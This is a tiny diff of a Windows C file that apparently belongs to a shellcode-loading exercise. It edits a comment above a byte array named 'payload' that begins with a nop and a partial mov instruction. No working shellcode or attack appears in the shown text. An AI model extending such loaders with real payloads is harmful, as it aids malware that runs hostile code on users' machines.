@@ -1,6 +1,6 @@
 #include <windows.h>
 
-// Payload outside the main function means
+// Payload outside the main function
 unsigned char payload[] = {
 	0x90,		// nop
 	0xb0,		// mov al
